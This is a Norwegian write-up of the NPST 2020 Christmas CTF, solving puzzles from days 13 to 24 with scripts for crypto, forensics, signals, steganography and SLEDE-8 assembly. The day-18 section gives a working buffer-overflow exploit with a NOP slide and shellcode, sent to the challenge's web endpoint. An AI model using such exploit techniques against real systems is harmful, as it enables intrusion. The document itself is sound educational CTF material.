Jeg matet den en lang rekke med null-bytes, og vi kan tydelig se at den XOR-er to ganger, først med hva som virker til å være fibonacci-tallrekken, og så med hva virker til å være passordet XOR-et med fibonacci-tallrekken. Om vi så regner ut alle disse XOR-operasjonene, og tar annenhver som ASCII-tegn får vi `PST{fib0nacc1_0net1m3_p4d}`, som er flagget.

### Egg #8

```
Takk for input!

Dette var føde til ettertanke. Hvis du har livslyst igjen kan du prøve på denne fila også.
```

Vi blir gitt fila `💀.s8`. Første jeg gjorde var som i forrige oppgaven og så på XOR-operasjonene. Det første som stakk ut var at de første par operasjonene var uavhenging av hva jeg skrev inn som input, men jeg merket at ved å skrive `EGG{` i starten av input var det flere av XOR-operasjonene som resulterte i null. Jeg fulgte stien og lagde et skript som talte opp antall nuller for hver operasjon du finner skriptet i `Egg 8`-mappen. Kjører vi skriptet får vi output `EGG{513d38_master_reverser}`, som er egget.

## 13. Desember

```
Følgende melding ble tilsendt NPST per faks, og ingen i postmottaket forstår innholdet. Det ser ut som den bruker en eller annen form for hex-enkoding, men selv hex-dekodet gir faksen ingen mening.

Klarer du å finne mening i meldingen?
```

Vi blir gitt tekstfilen `melding.txt`. Et farlig kaninhull her er å høre på noe av det oppgaveteksten sier om faks eller hex-enkoding, alt dette er bare sludder og SPST propaganda, noe jeg brukte timevis på å grave i uten hell. En observasjon jeg lagde meg tidlig, men noe jeg ikke gjorde noe med før lenge etterpå, var frekvensene på de forskjellige hex-tegnene i meldingen. Noen tegn er ganske frekvente og dukker opp ca. 170-180 ganger i meldingen, mens andre tegn dukker opp bare 40-50 ganger. Om vi så omplaserer alle de frekvente tegnene med mellomrom og de ikke så frekvente tegnene med stjerner fpr vi flagget:

```py
ct = open("melding.txt","r").read()
lines = ct.split("\n")
ct = ct.replace("\n","")

chars = "0123456789ABCDEF"
freq = {i:ct.count(i) for i in chars}

for i in lines:
    print("".join("*" if freq[j] < 100 else " " for j in i))
```

Output er et bilde av flagget: `PST{SNEAKY_FLAG_IS_SNEAKY}`

## 14. Desember

```
Det nyeste innen måltallsrapportering er antall fullførte e-læringsmoduler i SLEDE8 blandt de ansatte, så kunne du gjennomført modul 97672649875ca349? Rapporter tilbake som vanlig når du er ferdig!

Utviklerverktøyet finner du fortsatt her (slede8.npst.no). Se vedlagt dokumentasjon, eller på GitHub.
```

Laster vi inn e-løringsmodulen blir vi gitt følgende kode:

```
; Føde består av et ukjent antall verdier, der verdien 0x00 markerer siste verdi.
; Skriv ut verdiene i motsatt rekkefølge.

; Eksempel: 11223344556600 => 665544332211
; Eksempel: 0123456789abcdef00 => efcdab8967452301
```

Denne oppgaven baserer seg på `LAGR` og `LAST`-funksjonene i SLEDE-8. Man må lese igjennom føden, lagre den i minnet, og så lese igjennom minnet baklengs mens man printer ut. Her er SLEDE-8 kode som gjør nettopp det:

```
SETT r0, 0x01
SETT r1, 0x01
SETT r2, 1
SETT r6, 0xff
SETT r7, 0x01
loop:
LES r3
LIK r3, r4
BHOPP loop2
LAGR r3
PLUSS r0,r2
LIK r0, r8
BHOPP inc
HOPP loop
inc:
PLUSS r1, r2
HOPP loop
dec:
MINUS r1, r2 
HOPP loop2
loop2:
MINUS r0,r2
LAST r3
LIK r3,r4
BHOPP stopp
SKRIV r3
LIK r0, r8
BHOPP dec
HOPP loop2
stopp:
STOPP
```

Sender man inn koden får man flagget: `PST{InReverseCountryEverythingIsPossible}`




### Egg #9

```
Supert, du begynner jo virkelig å få dreisen på dette!.

I NPST er vi glad i kort og effektiv kode. Hvis du kjenner deg igjen i dette kan du se på en variant av dagens e-læringsmodul, dc0583ff102e48c6. Testene skal være de samme som du allerede har bestått, men krav til effektivitet, og det å fatte seg med korthet har blitt strengere.
```

Samme oppgave som den første, bare denne gangen er det blitt satt noen restriksjoner på antall linjer og sykler programmet kan bruke. Samme kode som over løser denne og, sender vi inn får vi egget: `EGG{5f5fc8819e2cc6be9c6a19370a5030af}`

## 15. Desember

```
I etterkant av en privat reise (tidligere i år) for å se fotball i England, har en av alvebetjentene flere ganger fanget opp et mystisk signal. Det ser ut som signalet er ganske kontinuerlig, men det varierer litt i frekvens.

Denne oppgaven har ligget i backloggen hos oss, men det hadde vært veldig fint om du kan ta en titt og se om det er en beskjed i signalet!
```

Vi blir gitt filen `data2.complex16u`. Laster vi denne inn i Universal Radio Hacker gjennkjenner den signalet som FSK (Frequency Shift Keying). Oppgaveteksten hinter til Manchester-enkoding. Går vi over til Analysis-fanen, setter `Decoding` til `Manchester II` og `View data as` til `ASCII` får vi flagget: `PST{m4nch3st3r_3nc0d1ng_1s_4_l0t_0f_fun!}`.

## 16. Desember

```
Jeg ligger fortsatt litt bakpå måltallsmessig etter 'svar alle'-hendelsen tidligere i måneden. Det er nok derfor best for din lønnsutvikling om du gjennomfører e-læringsmodul a522c5a55bcb743e i SLEDE8.

Utviklerverktøyet finner du fortsatt her (slede8.npst.no). Se dokumentasjon på GitHub.
```

Laster vi inn e-læringsmoduler får vi følgende oppgavetekst:

```
; Første byte med føde er et tall N som representerer
; antallet påfølgende bytes med føde.
; de påfølgende verdiene representerer en liste med verdier.
; skriv ut verdiene i lista sortert i stigende rekkefølge

; Eksempel: 06112233445566 => 112233445566
; Eksempel: 06665544332211 => 112233445566

; OBS: Implementasjonen kan ikke benytte mer enn (24* N^2 + 5000) skritt.
; OBS: Du kan endre maks antall skritt lokalt ved å skrive localStorage.setItem('🚲', 10000000)
```

Vi blir bedt om å lage en sorteringsalgoritme i SLEDE-8. Første man kan merke seg er at første byte er lengden på strengen, hvilken betyr at man ikke vil få en tallrekke på lenger enn 255 (0xff) bytes. Den minste grensen vi har på antall skritt er 5024 (24 * 1^2 + 5000) skritt, om vi klarer å lage en algoritme som sorterer en streng på 255 bytes på under 5024 skritt vil vi være i mål. Og her kommer trikset; vi kan gå igjennom listen, og legge til én til hver minneaddresse lik tallet (pluss 256, så vi ikke overskriver programminnet). På den måten vil vi når listen er lest ha antallet på hvert tall i listen, som vi bare kan gå igjennom og printe det annallet. Vi trenker ingen hokus pokus sorteringsalgoritme. Programmet vil ikke være på sitt raskeste når den sorterer lister som er 4 byte lange, men det trenger den ikke heller, så lenge den kjører under 5024 skritt.

```
SETT r1, 0xfe ; vi setter r1 til 0xfe, slik at vi ikke overskiver programminnet
LES r2 ; r2 er lengden på tallrekken
SETT r4, 1 ; r4 er konstant 1
SETT r5, r2 ; r5 plir brukt til å trekke fra 1 for hver byte vi leser, så vi vet når vi er tom for føde
SETT r6, 0xff ; blir brkt i enden av programmet til å printe ut 0xff-bytes

; leser føde
read:
LES r0 ; vi leser til r0, slik at det peker på samme minneaddresse som tallet
LAST r11
PLUSS r11, r4
LAGR r11
MINUS r5, r4
ULIK r5, r8
BHOPP read

; neste løkke starter med å legge 1 til r0, så vi setter den til 0xff så vi starter på 0
SETT r0, 0xff
write:
PLUSS r0, r4
LIK r0, r6
BHOPP finish
LAST r11

; skriver ut like mange ganger som er lagret i minneaddressen
write_loop:
LIK r11, r8
BHOPP write
SKRIV r0
MINUS r11, r4
HOPP write_loop

finish:
SETT r0, r6
LAST r11
sub:
LIK r11, r8
BHOPP stopp
SKRIV r0
MINUS r11, r4
HOPP sub

stopp:
STOPP
```

Kjører vi koden får vi flagget: `PST{youtu.be/k4RRi_ntQc8}`

Flagget lenker til en video hvor Barack Obama blir spurt om sorteringsalgoritmer, og gir et kult svar.

### Egg #10

```
👏

Erfaringene du tilgner deg nå kan bli avgjørende før du vet ordet av det.

Hvis du vil teste hvor effektiv algoritmen din er kan du forsøke deg på e-læringsmodul 611b1f7f8c63469e
```

Samme som oppgaven over, men vi får strengere restriksjoner på 4608 skritt. Samme kode funker her også, og gir oss egget: `EGG{a34ae56d455e16b08cfe07f585ed44d9}`

## 17. Desember

```
NPST har avlyttet telefonen til en mistenkt etteretningsoffiser fra SPST. Teleoperatøren har oversendt data i henhold til ETSI232-1, men våre systemer klarer ikke å forstå innholdet. Vi mistenker at det er benyttet en svært enkel kode, men våre analytikere sier det er LITE SANNSYNLIG at XMAS er benyttet.
```
Vi blir gitt filene `data.b64.txt` og `ETSI232-1.txt`. Den første filen inneholder noe base-64 ASN.1. Om vi dekoder dette finner vi noen hex-strenger. Oppgaveteksten hinter til XOR, altså at alle tegnene i meldigene er XOR-et med en eller flere bytes. Bruteforcer vi hex-strengene finner vi at byte 0x24 er brukt, og vi får følgende melding:

```
God kveld!
Over.
Hei. 
Har du funnet noe gøy?
Ja, se her.
?? 
Jeg ser ingen ting. 
****************
Jeg ser bare ****************
Oi, jeg copy/pastet passordet mitt ved en feil. 
Bra det ble sladdet
jeger2
??
Det funket ikke...
... vent litt ..
d9c36ccf
hæ?
6a38
4281
b48f
????
d14db694daae
Hva ser jeg på=
Det skal være en uuid. 
Bindestrekknappen min funker ikke
Og hva godt skal det gjøre meg?
Du må ta md5 av uuid'en som lowercase hex og legge til det vanlige.
Skjønner!
Whoops. Uuiden skulle starte med c9c(...)
... og slutte med (...)4a3
WIN! Takk.
Under og inn.
```

Vi blir gitt UUID-en `d9c36ccf-6a38-4281-b48f-d14db694daae`, bytter vi ut de første tre tegnene med `c9c` og de siste med `4a3` får vi `c9c36ccf-6a38-4281-b48f-d14db694d4a3`, regner vi så ut MD5-hashen av dette får vi `0ae06caf767ac7ebce290cfc57be6a6f`, legger vi til "det vanlige" ender vi opp med `PST{0ae06caf767ac7ebce290cfc57be6a6f}`, som er flagget.

## 18. Desember

```
SPST har publisert noe de påstår er en svært avansert kunstig intelligens på sin GitHub-konto (https://github.com/SydpolarSikkerhetstjeneste).

Jeg har sjekket den ut på pingvin.spst.no, men får bare opp et vakkert bilde av en pingvin. Kan du ta en titt?
```

Går vi til SPSTs github finner vi repoet [kunstig-pingvinopptellingsintelligens](https://github.com/SydpolarSikkerhetstjeneste/kunstig-pingvinopptellingsintelligens). Her finner vi én javascript-fil `ai.js`, som virker til å inneholde en god del SLEDE-8 kode. Under ser vi en liten snutt av koden:

```
const tellPingvinerImpl = (flag) => `
SETT r10, 0
SETT r11, 1
HOPP forbi

flagg:
.DATA ${Buffer.from(flag).join(",")},0

print:
LAST r2
PLUSS r0, r11
LIK r2, r10
BHOPP print_ferdig
SKRIV r2
HOPP print
print_ferdig:
RETUR

input_buffer:
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
.DATA 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

forbi:
TUR les_input
TUR tell_pingviner
TUR skriv_svar
fin:
STOPP


les_input:
FINN input_buffer
les_neste_input:
LES r2
; ULK r2, r11 ; dette funker ikke...
LIK r2, r10
BHOPP lest_ferdig
LAGR r2
PLUSS r0, r11
HOPP les_neste_input
```

Til en erfaren programmerer lukter dette buffer overflow. Vi har her et program som tar inn usanitert input og skriver det til en buffer med en bestemt lengde, uten noe form for gardering om at dette inputtet passer i bufferen. Kommer noe av det brukeren skriver inn utenfor bufferen vil programmet se på det som kode og kjøre det uten spørsmål. Vi har i tillegg litt data på toppen av programmet som virker til å være flagget. Det enseste vi nå må gjøre er å finne ut hvor og hvordan denne koden kjører, for å så utvikle en exploit.

Går vi på https://pingvin.spst.no/ får vi et bilde av en pingvin, noe tekst om pingviner med en lenke til https://egg.spst.no/, og en pil ved siden av en pingvinemoji. Trykker vi på pilen kommer et input-felt opp. Skriver vi noe tekst med pingvin-emojier får vi antallet pingviner i teksten vi skrev inn. Om vi så inspiserer element, går til "Network", og skriver noe inn i feltet, si "test", og trykker "Tell pingviner", ser vi at den sender etterspørselen `https://pingvin.spst.no/.netlify/functions/count?input=dGVzdA%3D%3D` til serveren. Denne returnerer en JSON-streng `{"svar":[0]}`. Her ser det ut som det skjer følgende:

1. Input blir base64-enkodet og sendt til server
2. Server dekoder base64 og kjører SLEDE-8 koden med vår input som føde
3. Server svarer med output av SLEDE-8 program som JSON-streng

Så var det bare å skrive exploit. Her kan det være nytting å a tatt en titt på [runtime.ts](https://github.com/PSTNorge/slede8/blob/main/src/runtime.ts) i SLEDE-8 repoet til PST, siden den forteller oss hvordan SLEDE-8 binaries blir kjørt, og hvilke opcodes tilhører hvilke kommandoer. En ting vi kan allerede merke oss er at input-bufferen er 8 linjer med 16 bytes, som gir den lengde på 128 bytes. Ved å telle instruksjoner før flagget vet vi også at den starter på byte 6 i minnet når programmet kjører.

Programmet kaller funksjonen `les_input` rett under input-bufferen, hvilket betyr at vi kan overskrive de instruksjonene den kjører etter funksjonskallet, slik at når den returnerer vil den kjøre vår kode. Vi har cirka 4-5 bytes til råde, så det beste hadde vært om vi kunne hoppet til et annet sted i minnet hvor vi har kontroll. Heldigvis har vi full kontroll over 128 bytes i minnet, så her kan vi skrive kode. Eneste problemet som igjenstår er at vi ikke vet nøyaktig _hvor_ i minnet vi er, siden vi ikke vet lengden på flagget. Dette kan løses ved å fylle bufferen med `NOPE`-kommandoer; vi vet sånn cirka hvor vi er i minnet, så ved å hoppe til et område med masse `NOPE`-kommandoer som gjør ingenting etterfulgt av en payload vil programmet fortsette nedover til den treffer og kjører payloaden. Dette kalles en NOP-slide, og brukes mye i buffer-overflow angrep.

Protip: ved å gå på https://slede8.npst.no/ kan du skrive SLEDE-8 kode, så trykke "DEL -> Monter -> Last ned" for å få en binærfil av koden. Åpner du denne med en hex-editor kan du se hvordan koden ser ut i binær format, som hjelper når du skal skrive payloaden.  

Ved litt prøving og feiling og experimentering med SLEDE-8 skrev jeg denne exploiten:

```py
from urllib.request import urlopen
from urllib.error import HTTPError
import base64

url = "https://pingvin.spst.no/.netlify/functions/count?input="
nope_slide = "0c"*121
shellcode = "01$$040C160C09980c0c0c080800"
pl = nope_slide + shellcode
end = ord("}")

for i in range(6, 46):
    num = hex(i+256)[3:]
    payload = pl.replace("$$",num)
    encoded = bytes.fromhex(payload.replace(" ",""))
    res = eval(urlopen(url+base64.b64encode(encoded).decode()).read())["svar"][0]
    print(chr(res), end = "")
    if res == end:
        break
```

Jeg kunne teoretisk sett skrive en payload som gir hele flagget med en gang, men jeg gikk istedet med det lettere og kanskje mindre pene måten å bare hente ut ett og ett tegn av flagget og printe det ut. Kjører vi koden får vi jevnt og trutt ut flagget: `PST{EveryoneAboardTheNOPESlede8}`. Gir litt mer 1337-feel når man sakte printer ut flagget instedet for at hele greia kommer med en gang, tilsetter et spenningselement :)


## 19. Desember

```
For å forhindre at ansvaret for julegavehvelvet hviler på én enkeltperson, har alvebetjent Sigurd utviklet en algoritme som kan dele opp en hemmelighet i X-antall likeverdige andeler. Algoritmen er videre laget slik at det trengs Y-antall vilkårlige andeler for å kunne komme tilbake til den opprinnelige hemmeligheten.

I utprøvingsfasen har Sigurd delt opp nøkkelen til julegavehvelvet i fem andeler, og bestemt at det trengs tre andeler for å låse det opp. Sigurd har gitt de to første andelene (1 og 2) til Jule NISSEN, mens alvebetjent Reidar har fått andel 3, og alvebetjent Adrian har fått andel 5. Sigurd har beholdt andel 4 selv.

(X=5, Y=3)

Dette vil si at hvelvet kan åpnes enten av Jule NISSEN sammen med én vilkårlig alvebetjent, eller av alle tre alvebetjentene sammen.

Som en kuriositet kan vi nevne at Sigurds favorittall er 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151 (base 10)

Nå viser det seg at Jule NISSEN har mistet sine andeler. De gjenværende kjente andelene er

* Reidar: (3, 570999082059702856147787459046280784390391309763131887566210928611371012340016305879778028495709778777)
* Sigurd: (4, 922383132557981536854118203074761267092170577309674587606956115449137789164641724882718353723838873409)
* Adrian: (5, 1361613195680829887737031633110361870469394661742852962657887598996346260195423498636393760259000241699)

Klarer du å gjenskape nøkkelen til julegavehvelvet? Det sier seg selv at dette haster!

```

Oppgaveteksten hinter veldig til Shamir's Secret Sharing scheme. Dette er en mattematisk måte å dele opp meldinger ved bruk av polynomer. Hver andel er et punkt i et todimensjonalt koordinatsystem, og med nok punker kan man ved hjelp av Lagrange interpolering regne ut en polynomfunksjon som skjerer y-aksen på et bestemt punk som er hemmeligheten. I tillegg brukes en endelig kropp (på engelsk *finite field* eller *Galois field*) med en primtallsverdi for å videre obfuskere meldingen. Ved å gå på factordb.com, som er en primtallsdatabase, kan vi allerede se at Sigurds favorittall er et primtall, så det brukes antagelig for den endelige kroppen.

Et veldig forenklet eksempel ville vært hvis man har et hemmelig tall `4`, som man skal dele opp i to andeler. Man lager da et førstegradsuttrykk, si `f(x) = 5x + 4`, hvor konstantleddet er hemmeligheten. Så regner man ut `f(1)` og `f(2)` for å få andelene `(1, 9)` og `(2, 14)`. Legg så merke til at det finnes kun én unik linje som kan tegnes igjennom to punkter. Det samme gjelder for alle polynomer; har man N punkter, kan man bestemme et (N-1)-grads polynomuttrykk. Måten man gjør dette på er ved Lagrange interpolering. [Denne videoen](https://www.youtube.com/watch?v=kkMps3X_tEE) er nok et godt sted å starte om man vil ha en dypere forståelse for hvordan dette funker.

Man tregner ikke å være mattegeni for å løse denne, for Wikipedia har allerede gjort mye av jobben på sin [artikkel om Shamir's Secret Sharing](https://en.wikipedia.org/wiki/Shamir%27s_Secret_Sharing). Der finner vi et skript som kan brukes til å regne ut hemmeligheter ved å gi andeler. Importerer man bare det inn og gir den andelene får vi hemmeligheten:

```py
from secret_sharing import recover_secret

# Sigurds favorittall, som er et primtall
prime = 6864797660130609714981900799081393217269435300143305409394463459185543183397656052122559640661454554977296311391480858037121987999716643812574028291115057151

# andelene
shares = [
(3, 570999082059702856147787459046280784390391309763131887566210928611371012340016305879778028495709778777),
(4, 922383132557981536854118203074761267092170577309674587606956115449137789164641724882718353723838873409),
(5, 1361613195680829887737031633110361870469394661742852962657887598996346260195423498636393760259000241699)
]

# konstruerer hemmeliheten fra andelene i GF(prime)
secret = recover_secret(shares, prime = prime)

# konverterer hemmeligheten til ASCII og printer ut
print(bytes.fromhex(hex(secret)[2:]).decode())
```

Output:

`PST{f0rd3lt_4nsv4r_3r_d3t_b3st3_4nsv4r3t!}`, som er flagget

## 20. Desember

```
Vi tror en inntrenger kan ha skaffet seg tilgang til vårt interne nettverk. Systemvariabler ser ut til å være tuklet med, men vi tror også at noe informasjon er på avveie?

Etter alle de merkelige hendelsene i det siste monitorerer vi heldigvis nettet vårt. Denne saken har høy prioritet, fint om du ser på den med en gang.
```

Vi blir gitt fila `trafikk.pcapng`, som er et opptak av nettverkstrafikk. Dette kan åpnes ved bruk av verktøy som Wireshark. Første ting jeg gjør når jeg får en Wireshark-fil er å gå på `File -> Export Objects -> HTTP`. Her kan vi se alle filer som har gått over HTTP, og vi ser allerede noe shady. `shadyserverfunction.azurewebsites.net` virker ikke helt bra. Exporterer man objektet og tar en titt med en tekst-editor ser man masse base64, etterfulgt av en streng som starter på "PK", så antagelig en zip-fil. Dekoder man base64-stengen får man masse hemmeligheter. Disse er det bare å lime inn i en tekstfil og sette som master secret ved å gå til `Edit -> Preferences -> TLS -> (Pre)-Master-Secret log file name`, da vil Wireshark automatisk dekryptere trafikk kryptert med disse hemmelighetene.

Etter det var det den zip-fila. Lagrer vi innholdet som en .zip-fil og pakker ut innholdet får vi en ny fil; `file2`. Åpner vi denne fila i en hex-editor ser vi at den har headeren `0A 0D 0D 0A`, hvilket betyr at det er nok en pcapng-fil. Åpner vi denne i Wireshark og gjør samme prosedyre med `File -> Export Objects -> HTTP` finner vi en PDF-fil `secretdoc.pdf`. Exporterer vi denne og åpner finner vi flagget `PST{5h4dy53rv3r}`

## 21. Desember

```
Vi har fått en melding fra en samarbeidende tjeneste, men det ser ut til at de har glemt å sende nøkkelen i en egen, sikker kanal.

En annen alvebetjent har identifisert et mønster i meldingen, og har klart å dekode de fire første tegnene. Dessverre har denne alvebetjenten avspasert idag, etter sigende for å spille tetris, så vi trenger din hjelp med resten av meldingen.

Lykke til!
```

Vi blir gitt filen `generasjoner.txt`. Oppgaveteksten hinter til en oppgave som var i fjor, den notoriske rule30-sneglen. Om man ikke tar den referansen, vil man sitte lenge og tenke på hva oppgaven muligens kan dreie seg om. Først la oss ta en titt på filen:




```
gen0:01010000010100110101010001111011
gen1:010110001101110101010110100010010001111101011101000100110101110100011111100111011101101100110111101001100101110101000001001101011101110100100110101001101001010100100110010101101001111111000001110101101001010100010110010110001010010111010110100101100101100010100011100111011100000100000101
gen2:010011010100010101010010110111111010000101000101101111010100010110100000111001000100100111010000101110111100010101100011110101000100010111111010101110101111010111111011110100101110000001100010010100101111010110110011110011011011110001010010111100111100110110110100111001000110001110001101
gen3:011101010110110101011110010000001011001101101100100001010110110010110001001111101111111001011001100010000110110100110100010101101110110000001010100010100001010000001000010111100011000010110111110111100001010010011100011101001000011011011110000111000111010010010111001111101011010011010101
gen4:000101010010010101000011111000011001110100100111110011010010011110011011110000100000001111001110110111001010010111010110110100100010011000011010110110110011011000011100110000110101100110010000010000110011011111100110100101111100101001000011001001101001011111110001110000101001011101010101
gen5:101101011111110101100100001100101110010111111000011101011111100011101000011001110000010001110010010001111011110001010010010111110111101100101010010010011101001100100111011001010100111011111000111001011101000000111010111100000111101111100101111110101111000000011010011001101111000101010101
gen6:100101000000010100111110010111100011110000001100100101000000110100101100101110011000111010011111111010001000011011011111110000010000100111101011111111100101110111111001001111010111001000001101001111000101100001001010000110001000100000111100000010100001100000101011101110100001101101010100
gen7:111101100000110111000011110000110100011000010111111101100001010111100111100011101101001011100000001011011100101001000000011000111001111000101000000000111100010000001111110001010001111100010101110001101100110011111011001011011101110001000110000110110010110001101000100010110010100101010111
gen8:000100110001010001100100011001010110101100110000000100110011010000111000110100100101111000110000011001000111101111100000101101001110001101101100000001000110111000010000011011011010000110110100011010100111011100001001111001000100011011101011001010011110011010101101110110011110111101010000
gen9:001111011011011010111110101111010010100111011000001111011101011001001101010111111100001101011000101111101000100000110001100101110011010100100110000011101010001100111000101001001011001010010110101010111001000110011110001111101110101000101001111011100011101010100100010011100010000101011000
```

Første som er tydelig er at gen0 er binær ASCII for `PST{`. Ser man litt nærmere på de andre generasjonene merker man også et slags trekant-mønster med 1'erne og 0'ene. Her er det antagelig noe cellular automata. Man starter som regel med en liste med bits, og ved å ta tre og tre bits bestemmer man hva neste generasjon med bits skal se ut som. I noen tilfeller, som med rule30, oppstår et mønster om man gjør dette nok ganger. Oppgaven blir rett og slett å konstruere gen0 fra de gitte generasjonene. Si tallet `N` er lengden på `gen0`. Om vi tar `gen0[N-2]` og `gen0[N-1]`, og måler de opp mot `gen1[N-1]`, burde vi allerede ha nok informasjon til å bestemme hva `gen0[N]` skal være. 

Alt vi trenger å gjøre nå er å finne hvilken regel som er brukt, og så ved den regelen reversere gen0. Vi kan finne regelen ved å gå igjennom alle bits i grupper på tre (`gen0[i:i+3] for i in range(N-2)`) og sjekke hva resulterende bit blir. Om vi så etter å ha generert regelen bruker metoden over kan vi få ut flagget. Her er et skript som gjør det:

```py
rule={}

gen0 = "01010000010100110101010001111011"
gen1 = "010110001101110101010110100010010001111101011101000100110101110100011111100111011101101100110111101001100101110101000001001101011101110100100110101001101001010100100110010101101001111111000001110101101001010100010110010110001010010111010110100101100101100010100011100111011100000100000101"

# lager liste av gen1 med samme lengde som gen0
# gjør det lett å sammenligne gen0 og gen1 siden
# det siste elementet av denne listen vil høre til
# det siste elementet i gen0
subgen1 = gen1[:len(gen0)]

# genererer regel ved å sammenligne gen1 og gen0
def genrule(g0,g1):
    for i in range(len(g0)-2):
        rule[g0[i:i+3]] = g1[i+1]

# bygger gen0 ved bruk a gen1
def getflag(g0,sg1,g1):
    while len(g0) < len(g1):
        a = g0[-2:]
        if rule[a+"0"]==sg1[-1]:
            g0+="0"
        else:
            g0+="1"
        sg1 += g1[len(sg1)]
    return g0

# converterer binærtall til ascii
def bin2ASCII(s):
    return ''.join(chr(int(s[i*8:i*8+8],2)) for i in range(len(s)//8))

# kjør funksjonene og print flagget
genrule(gen0,gen1)
gen0 = getflag(gen0,subgen1,gen1)
flag = bin2ASCII(gen0)

print(flag)
```

Kjører vi skriptet får vi ut flagget: `PST{r3v3rs1bl3_c3llul4r_4ut0m4t0ns?}`

## 22. Desember

```
Hei,

Den eneste stasjonen for dekryptering av ønskelister har tatt kvelden! Vi har mottatt en kryptert ønskeliste fra en person høyt oppe på julenissens liste over snille barn, og nå klarer vi ikke dekryptere den. Med bare to dager til jul så er dette mildt sagt krise.

En av alvebetjentene har forsøkt å lese ut fastvaren fra en av reservesendestasjonene for å få tak i kryptonøkkelen, uten stort hell. Dessverre ser det ut som at mikrokontrolleren har lesebeskyttelse slått på.

Som et sidespor har en annen alvebetjent forsøkt å koble seg på med et oscilloskop for å måle strømforbruket, mens hun sendte 50 ønskelister som bare inneholdt vrøvl. På tross av iherdig innsats, ser ikke alvebetjenten noen sammenheng mellom de sendte ønskelistene og målt strømforbruk.

Finner du en sammenheng mellom ønskelister og strømforbruk? Og får du tak i kryptonøkkelen, og dekryptert den viktige meldingen?
```

Vi blir gitt tre filer: `viktig_melding.json`, `ønskelister.npy`, og `strømforbruk.npy`. Litt googling viser at det finnes et angrep på AES og andre blokk-chiffer som gjør det mulig å analysere strømbruken av en mikrokontroller mens den krypterer et visst plaintekst. Denne oppgaven har vært i andre CTFer før, sp jeg valgte som mange andre å følge en slik writeup: https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/

Kopierer man koden fra writeupen og bytter ut filnavnene med `ønskelister.npy` og `strømforbruk.npy` får man krypteringsnøkkelen: `9dedc4e592b7c01d43667efaa74eb6e5`. Dekrypterer man så innholdet i `viktig_melding.json` med denne nøkkelen ved bruk av AES-128 i ECB-modus får man flagget: `PST{1n_4_w0rld_th4t_sh0uts_4ll_1_n33d_1s_4_wh1sp3r!}`.

## 23. Desember
```
Julenissens verksted på Nordpolen har mottatt dette julekortet. Kortet lå ikke i konvolutt, og har ingen poststempling eller frimerker. Noen må altså ha puttet det rett i postkassa.

Kan du undersøke om det er noe rart med kortet?
```

![julekort.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/23.%20Desember/julekort.png)

Vi blir gitt et bilde `julekort.png`. Jeg gjør som jeg alltid gjør med bilder og sjekker exiftool og stegsolve. I stegsolve ser jeg at det er gjemt noe QR-koder i LSB, og om man studerer detaljene i orginalbildet så merker man at julekulene er i rekkefølgen rød + grønn + blå. Antagelig skal man XOR-e sammen LSB i de forskjellige fargekanalene. Gjør man dette får man følgende QR-kode:

![flag.png](https://raw.githubusercontent.com/williamsolem/NPST-2020-Writeup/master/NPST%202020%20Writetup/Oppgaver/23.%20Desember/flag.png)


Leser man QR-koden får man `PST{4ll_th3s3_d3l1c10us_l4y3rs}`, som er flagget.

## 24. Desember

Så kom vi til julaften. Her ble det mye kluss. Oppgaven ble sluppet kvelden før, og folk løste og leverte utover natten. Neste morgen ble det mye bråk blant alvebetjenter som hadde følt seg snutt. Oppgaven var også ganske krevende - man ble gitt en tjenestepakke som installerte en "sledesimulator". I denne kunne man laste opp s8-binærfiler for å styre en slede. Måten dette funket på var at programmet ble matet en ASN.1 BER-enkodet streng som inneholdt posisjonen på sleden både i dette tidssteget og det forrige, samt koordinatene til en landingsplattform. Med dette skulle man skrive et program som skulle gi instruksjoner til tre motorer som kunne skrues av og på, i form av ASN.1 BER-enkodet oppgulp. Til alt dette skulle man skrive et program i SLEDE-8 som kunne konsekvent lande på landingsplattformen med en maksimums vertikal- og horisontal-fart, gitt forskjellige startfarter. 

Krevede oppgave, spesielt for julaften. Jeg klarte ikke å løse den, litt ut av skuffelse for at det kom en slik oppgave på selve julaften -- og at den kom ut 12 timer før den skulle, og litt ut av at jeg som mange andre hadde ting å gjøre på julaften annet enn å sitte på PC-en og løse oppgaver. Men jeg kan i det minste dele noe av det jeg kom frem til med denne oppgaven; en ting jeg bemerket meg var at tallene i BER-enkodingen ofte kom etter en null-byte, og jeg brukte dette til å lese tall. Det hendte i noen tilfeller at dette ikke funket, og at programmet gikk tom for føde. 

### EGG #11

